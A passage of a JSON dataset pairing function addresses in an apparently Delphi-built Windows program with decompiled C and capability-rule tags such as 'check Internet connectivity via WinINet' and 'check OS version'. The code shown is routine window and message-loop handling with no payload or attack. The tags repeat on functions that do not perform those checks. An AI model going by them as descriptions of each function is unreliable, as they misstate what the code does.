        "decompiled_code": "\nvoid fcn.0045cc3c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    \n    iVar1 = sub.user32.dll_IsIconic(*(in_EAX + 0x30));\n    if (iVar1 == 0) {\n        return;\n    }\n    sub.user32.dll_SetActiveWindow(*(in_EAX + 0x30));\n    if ((*(in_EAX + 0x44) != 0) && ((*(in_EAX + 0x5b) != '\\0' || (*(*(in_EAX + 0x44) + 0x57) != '\\0')))) {\n        uVar2 = fcn.0044407c();\n        iVar1 = sub.user32.dll_IsWindowEnabled(uVar2);\n        if (iVar1 != 0) {\n            sub.user32.dll_DefWindowProcA(*(in_EAX + 0x30), 0x112, 0xf120, 0);\n            goto code_r0x0045cca5;\n        }\n    }\n    fcn.0045bb94();\ncode_r0x0045cca5:\n    uVar3 = (***0x484484)(1, 0, 0, 0x40);\n    iVar1 = uVar3 >> 1;\n    if (iVar1 < 0) {\n        iVar1 = iVar1 + ((uVar3 & 1) != 0);\n    }\n    uVar3 = (***0x484484)(0, iVar1);\n    iVar1 = uVar3 >> 1;\n    if (iVar1 < 0) {\n        iVar1 = iVar1 + ((uVar3 & 1) != 0);\n    }\n    sub.user32.dll_SetWindowPos(*(in_EAX + 0x30), 0, iVar1);\n    iVar1 = *(in_EAX + 0x44);\n    if (((iVar1 != 0) && (*(iVar1 + 0x22b) == '\\x01')) && (*(iVar1 + 0x57) == '\\0')) {\n        fcn.0045786c();\n        fcn.00459c90();\n    }\n    fcn.0045c288();\n    if (*(*0x485b4c + 100) != 0) {\n        uVar2 = fcn.0044407c();\n        sub.user32.dll_SetFocus(uVar2);\n    }\n    if (*(in_EAX + 0x122) != 0) {\n        (**(in_EAX + 0x120))();\n    }\n    return;\n}\n",
        "token_count": 572
    },
    "0045cd78": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045cd78(void)\n\n{\n    int32_t in_EAX;\n    uchar auStack264 [256];\n    \n    if (*(in_EAX + 0xa4) == '\\0') {\n        fcn.0040461c();\n    }\n    else {\n        sub.user32.dll_GetWindowTextA(*(in_EAX + 0x30), auStack264, 0x100);\n        fcn.004046b8();\n    }\n    return;\n}\n",
        "token_count": 102
    },
    "0045cdc4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045cdc4(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uchar uVar2;\n    uint in_stack_ffffffdc;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x45ce46;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    uVar2 = *(in_EAX + 0xa4) == '\\0';\n    if (uVar2) {\n        fcn.0040461c();\n    }\n    else {\n        puStack20 = &stack0xfffffffc;\n        fcn.0045cd78();\n        fcn.004049d4();\n        if ((!uVar2) || (*(in_EAX + 0x8c) != 0)) {\n            uVar1 = fcn.00404a88();\n            in_stack_ffffffdc = *(in_EAX + 0x30);\n            sub.user32.dll_SetWindowTextA(in_stack_ffffffdc, uVar1);\n            fcn.004045c8();\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffffdc;\n    uStack28 = 0x45ce4d;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 311
    },
    "0045ce54": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0045ce54(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    bool bVar2;\n    \n    bVar2 = false;\n    if (*(in_EAX + 0xb0) != 0) {\n        iVar1 = sub.user32.dll_IsDialogMessageA(*(in_EAX + 0xb0), param_2);\n        bVar2 = iVar1 != 0;\n    }\n    return bVar2;\n}\n",
        "token_count": 114
    },
    "0045ce78": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0045ce78(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    bool bVar2;\n    \n    bVar2 = false;\n    iVar1 = *(in_EAX + 0x44);\n    if ((((iVar1 != 0) && (*(iVar1 + 0x22f) == '\\x02')) && (*(*0x485b4c + 0x6c) != 0)) &&\n       (*(*(*0x485b4c + 0x6c) + 0x22f) == '\\x01')) {\n        iVar1 = sub.user32.dll_TranslateMDISysAccel(*(iVar1 + 0x254), param_2);\n        bVar2 = iVar1 != 0;\n    }\n    return bVar2;\n}\n",
        "token_count": 189
    },
    "0045cfb4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0045cfb4(void)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    unkbyte3 Var4;\n    \n    if (*(in_EAX + 0x12a) != 0) {\n        (**(in_EAX + 0x128))();\n    }\n    if (*(in_EAX + 0x44) != 0) {\n        uVar2 = fcn.0044407c();\n        iVar3 = sub.user32.dll_IsWindowEnabled(uVar2);\n        if ((iVar3 != 0) && (uVar2 = fcn.00403a28(),  uVar2 != '\\0')) {\n            Var4 = uVar2 >> 8;\n            uVar1 = 1;\n            goto code_r0x0045d011;\n        }\n    }\n    uVar1 = 0;\n    Var4 = 0;\ncode_r0x0045d011:\n    return CONCAT14(uVar1, CONCAT31(Var4, uVar1));\n}\n",
        "token_count": 237
    },
    "0045d020": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0045d020(uint param_1, uint32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = 0;\n    uVar4 = param_2;\n    iVar2 = sub.user32.dll_PeekMessageA(param_2, 0, 0, 0, 1, param_1);\n    if (iVar2 != 0) {\n        uVar3 = 1;\n        if (*(param_2 + 4) == 0x12) {\n            *(in_EAX + 0x9c) = 1;\n        }\n        else {\n            uVar4 = uVar4 & 0xffffff00;\n            if (*(in_EAX + 0xda) != 0) {\n                (**(in_EAX + 0xd8))();\n            }\n            cVar1 = fcn.0045cf80();\n            if ((cVar1 == '\\0') && (uVar4 == '\\0')) {\n                cVar1 = fcn.0045ce78();\n                if (cVar1 == '\\0') {\n                    cVar1 = fcn.0045cec8();\n                    if (cVar1 == '\\0') {\n                        cVar1 = fcn.0045ce54();\n                        if (cVar1 == '\\0') {\n                            sub.user32.dll_TranslateMessage(param_2);\n                            sub.user32.dll_DispatchMessageA();\n                            uVar4 = param_2;\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return CONCAT44(uVar4, uVar3);\n}\n",
        "token_count": 372
    },
    "0045d0f4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045d0f4(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    \n    if (*(in_EAX + 0xa4) == '\\0') {\n        if (*(in_EAX + 0x30) != 0) {\n            sub.user32.dll_SendMessageA(*(in_EAX + 0x30), 0xb020, 0, &arg_8h);\n        }\n    }\n    else {\n        fcn.0041c498();\n        puVar1 = fcn.00402b14();\n        *puVar1 = arg_8h;\n        puVar1[1] = arg_ch;\n        fcn.0041c358();\n    }\n    return;\n}\n",
        "token_count": 172
    },
    "0045d150": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045d150(int32_t lParam, int32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    if (*(in_EAX + 0xa4) == '\\0') {\n        if (*(in_EAX + 0x30) != 0) {\n            sub.user32.dll_SendMessageA(*(in_EAX + 0x30), 0xb020, 1, &lParam);\n        }\n    }\n    else {\n        iVar2 = *(*(in_EAX + 0xa8) + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.0041c4c8();\n                if ((*piVar1 == lParam) && (piVar1[1] == arg_ch)) {\n                    fcn.00402b44();\n                    fcn.0041c3a4();\n                    return;\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 250
    },
    "0045d1dc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045d1dc(void)\n\n{\n    if (**0x484580 != NULL) {\n        (***0x484580)();\n    }\n    return;\n}\n",
        "token_count": 38
    },
    "0045d1f4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045d1f4(int32_t **param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x45d207;\n    piVar2 = (**(param_2 + -0xc))();\n    *param_1 = piVar2;\n    uStack28 = 0x45d232;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    (**(*piVar2 + 0x2c))();\n    *in_FS_OFFSET = uStack32;\n    if (*(in_EAX + 0x44) == 0) {\n        puStack24 = 0x45d25b;\n        cVar1 = fcn.004039b8();\n        if (cVar1 != '\\0') {\n            puStack24 = 0x45d268;\n            fcn.00444058();\n            *(in_EAX + 0x44) = piVar2;\n        }\n    }\n    return;\n}\n",
        "token_count": 292
    },
    "0045d274": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045d274(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    *(in_EAX + 0xa5) = 1;\n    uStack28 = 0x45d352;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack36 = 0x45d2a0;\n    fcn.00408878();\n    if (*(in_EAX + 0x44) != 0) {\n        if (**0x484614 == 3) {\n            puStack36 = 0x45d2d0;\n            fcn.0045786c();\n        }\n        else if (**0x484614 == 7) {\n            *(*(in_EAX + 0x44) + 0x22b) = 1;\n        }\n        if (*(in_EAX + 0x5b) != '\\0') {\n            if (*(*(in_EAX + 0x44) + 0x22b) == '\\x01') {\n                puStack36 = 0x45d2f0;\n                fcn.0045cb8c();\n            }\n            else {\n                puStack36 = 0x45d2f9;\n                fcn.00456774();\n            }\n        }\n        do {\n            uStack40 = 0x45d319;\n            uStack44 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffd4;\n            puStack36 = &stack0xfffffffc;\n            fcn.0045d0d0();\n            *in_FS_OFFSET = uStack44;\n        } while (*(in_EAX + 0x9c) == '\\0');\n    }\n    *in_FS_OFFSET = uStack32;\n    *(in_EAX + 0xa5) = 0;\n    return;\n}\n",
        "token_count": 466
    },
    "0045d374": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045d374(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = sub.user32.dll_GetCapture();\n    if (iVar2 != 0) {\n        uVar3 = sub.user32.dll_GetCapture(0x1f, 0, 0);\n        sub.user32.dll_SendMessageA(uVar3);\n    }\n    fcn.00402bb4();\n    cVar1 = fcn.004039b8();\n    if (cVar1 == '\\0') {\n        uVar3 = fcn.00402bd4();\n        fcn.00402bb4(uVar3);\n        fcn.0040c7e4();\n    }\n    else {\n        fcn.00402bb4();\n        cVar1 = fcn.004039b8();\n        if (cVar1 == '\\0') {\n            if (*(in_EAX + 0xd2) == 0) {\n                fcn.00402bb4();\n                fcn.0045d56c();\n                return;\n            }\n            fcn.00402bb4();\n            (**(in_EAX + 0xd0))();\n        }\n    }\n    return;\n}\n",
        "token_count": 276
    },
    "0045d56c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0045d5a5)\n// WARNING: Removing unreachable block (ram,0x0045d5cc)\n\nvoid fcn.0045d56c(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint uStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint var_108h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack280 = &stack0xfffffffc;\n    uStack284 = 0x45d627;\n    uStack288 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffee0;\n    fcn.00404660();\n    arg_8h = 0x10;\n    fcn.0045cd78();\n    uVar1 = fcn.00404a88();\n    fcn.00404a88(uVar1);\n    fcn.0045d404(arg_8h);\n    *in_FS_OFFSET = arg_8h;\n    uStack284 = 0x45d62e;\n    uStack288 = 0x45d61e;\n    fcn.004045c8();\n    uStack288 = 0x45d626;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 292
    },
    "0045d644": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0045d644(uint param_1, uint16_t param_2)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int16_t iVar3;\n    int32_t in_EAX;\n    uint32_t uVar4;\n    uint uVar5;\n    char acStack20 [4];\n    \n    uVar5 = 0;\n    acStack20[0] = '\\x01';\n    iVar1 = *(*0x485b4c + 0x68);\n    if ((iVar1 == 0) || (*(iVar1 + 0x2aa) == 0)) {\n        if (*(in_EAX + 0xf2) != 0) {\n            uVar5 = (**(in_EAX + 0xf0))(acStack20);\n        }\n    }\n    else {\n        uVar5 = (**(iVar1 + 0x2a8))(acStack20);\n    }\n    if (iVar1 != 0) {\n        if ((*(iVar1 + 0x1c) & 0x10) != 0) {\n            acStack20[0] = '\\0';\n        }\n        iVar3 = fcn.00444218();\n        if (((iVar3 == -1) && (*(iVar1 + 0x57) == '\\0')) && (*(iVar1 + 0x220) == 0)) {\n            acStack20[0] = '\\0';\n        }\n    }\n    if ((acStack20[0] != '\\0') && (uVar5 == '\\0')) {\n        if ((iVar1 != 0) && ((cVar2 = fcn.00444380(),  cVar2 != '\\0' && (*(iVar1 + 0x23c) != 0)))) {\n            fcn.0044407c();\n            uVar4 = fcn.0045dd98();\n            if (uVar4 == '\\0') {\n                return uVar5;\n            }\n            uVar5 = (**(**(in_EAX + 0x4c) + 0x20))(param_1, uVar4 & 0xffff0000 | param_2);\n            return uVar5;\n        }\n        if (*(in_EAX + 0x50) == 0) {\n            if (*(in_EAX + 0xa4) == '\\0') {\n                sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb01f, param_2, param_1);\n            }\n        }\n        else {\n            if (*(in_EAX + 0x44) != 0) {\n                fcn.0044407c();\n            }\n            uVar4 = fcn.0045dd98();\n            if (uVar4 != '\\0') {\n                uVar5 = (**(**(in_EAX + 0x4c) + 0x20))(param_1, uVar4 & 0xffff0000 | param_2);\n            }\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 655
    },
    "0045d7ac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0045d7ac(uchar *param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    uVar2 = 0;\n    *param_1 = 1;\n    iVar1 = *(*0x485b4c + 0x68);\n    if ((iVar1 == 0) || (*(iVar1 + 0x2aa) == 0)) {\n        if (*(*0x485b48 + 0xf2) != 0) {\n            uVar2 = (**(*0x485b48 + 0xf0))(param_1);\n        }\n    }\n    else {\n        uVar2 = (**(iVar1 + 0x2a8))(param_1);\n    }\n    return uVar2;\n}\n",
        "token_count": 172
    },
    "0045d814": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0045d814(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack28 = &fcn.0045d814::var_1h + 1;\n    uStack32 = 0x45d891;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    fcn.00404a88();\n    cVar1 = fcn.0045d7ac();\n    if (((var_1h != '\\0') && (cVar1 == '\\0')) && (cVar1 = fcn.0045dd98(),  cVar1 != '\\0')) {\n        fcn.0045e608();\n        (**(**(in_EAX + 0x4c) + 0xc))();\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x45d898;\n    uStack32 = 0x45d890;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 292
    },
    "0045d8a4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0045d8a4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack28 = &fcn.0045d8a4::var_1h + 1;\n    uStack32 = 0x45d91a;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    cVar1 = fcn.0045d7ac();\n    if (((var_1h != '\\0') && (cVar1 == '\\0')) && (cVar1 = fcn.0045dd98(),  cVar1 != '\\0')) {\n        fcn.0045e608();\n        (**(**(in_EAX + 0x4c) + 0x10))();\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x45d921;\n    uStack32 = 0x45d919;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 289
    },
    "0045d9e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0045d9e8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar auStack20 [8];\n    \n    sub.user32.dll_GetCursorPos();\n    iVar1 = fcn.0043c0f4();\n    iVar2 = fcn.0043a9d4();\n    if (iVar1 != *(in_EAX + 0x48)) {\n        if (((*(in_EAX + 0x48) != 0) && (iVar2 == 0)) || ((iVar2 != 0 && (iVar2 == *(in_EAX + 0x48))))) {\n            fcn.0043e9fc(0);\n        }\n        *(in_EAX + 0x48) = iVar1;\n        if (((*(in_EAX + 0x48) != 0) && (iVar2 == 0)) || ((iVar2 != 0 && (iVar2 == *(in_EAX + 0x48))))) {\n            fcn.0043e9fc(0);\n        }\n    }\n    return CONCAT44(auStack20, iVar1);\n}\n",
        "token_count": 255
    },
    "0045da60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045da60(void)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x45db70;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x45da8a;\n    fcn.0045d9e8();\n    if ((*(in_EAX + 0x88) != '\\0') && (*(in_EAX + 0x48) == 0)) {\n        puStack48 = 0x45daa9;\n        fcn.0045dfb8();\n    }\n    puStack48 = 0x45dab3;\n    fcn.0045b920();\n    puStack48 = 0x45dabe;\n    fcn.0043a990();\n    puStack48 = 0x45dacb;\n    fcn.0045dc20();\n    bVar1 = true;\n    uStack52 = 0x45db17;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    if (*(in_EAX + 0x102) != 0) {\n        puStack48 = &stack0xfffffffc;\n        (**(in_EAX + 0x100))();\n    }\n    fcn.0045d984();\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x45db31;\n    iVar3 = sub.kernel32.dll_GetCurrentThreadId_1();\n    if (iVar3 == **0x484854) {\n        puStack48 = 0x45db42;\n        cVar2 = fcn.0042259c();\n        if (cVar2 != '\\0') {\n            bVar1 = false;\n        }\n    }\n    if (bVar1) {\n        puStack48 = 0x45db55;\n        sub.user32.dll_WaitMessage();\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x45db77;\n    uStack40 = 0x45db6f;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 575
    },
    "0045dc20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045dc20(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar in_ZF;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x45dc34;\n    fcn.004049d4();\n    if (!in_ZF) {\n        puStack20 = 0x45dc40;\n        fcn.0040461c();\n        if (*(in_EAX + 0xfa) == 0) {\n            puStack20 = 0x45dc68;\n            fcn.00437758();\n            puStack20 = 0x45dc75;\n            fcn.0044a088();\n            uStack24 = 0x45dca5;\n            uStack28 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe4;\n            puStack20 = &stack0xfffffffc;\n            fcn.00403a28();\n            *in_FS_OFFSET = uStack28;\n            puStack20 = 0x45dcac;\n            uStack24 = 0x45dca4;\n            fcn.00403820();\n            return;\n        }\n        puStack20 = 0x45dc58;\n        (**(in_EAX + 0xf8))();\n    }\n    return;\n}\n",
        "token_count": 302
    },
    "0045dcb4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045dcb4(int32_t arg_8h)\n\n{\n    uint8_t in_AL;\n    int32_t iVar1;\n    \n    iVar1 = sub.user32.dll_IsWindowVisible(*(*(arg_8h + -4) + 0x30));\n    if ((1U - (iVar1 == 0) == *0x483f1c) && (in_AL != *0x483f1c)) {\n        sub.user32.dll_SetWindowPos(*(*(arg_8h + -4) + 0x30), 0, 0, 0, 0, 0, *(in_AL * 2 + 0x483f20));\n        *0x483f1c = in_AL;\n    }\n    return;\n}\n",
        "token_count": 170
    },
    "0045dd10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045dd10(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x30) != 0) {\n        iVar2 = fcn.0045ad6c();\n        if (-1 < iVar2 + -1) {\n            do {\n                iVar3 = fcn.0045ad58();\n                if (*(iVar3 + 0x57) != '\\0') {\n                    if ((*(iVar3 + 400) == 0) || (cVar1 = fcn.00444380(),  cVar1 != '\\0')) {\ncode_r0x0045dd77:\n                        fcn.0045dcb4(&stack0xfffffffc);\n                        return;\n                    }\n                    fcn.0044407c(*(iVar3 + 400));\n                    iVar3 = sub.user32.dll_IsChild();\n                    if (iVar3 == 0) goto code_r0x0045dd77;\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        fcn.0045dcb4(&stack0xfffffffc);\n    }\n    return;\n}\n",
        "token_count": 276
    },
    "0045dd98": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0045dd98(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x4c) == 0) {\n        fcn.00406298();\n        fcn.0042e730();\n    }\n    return *(in_EAX + 0x4c) != 0;\n}\n",
        "token_count": 76
    },
    "0045ddc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
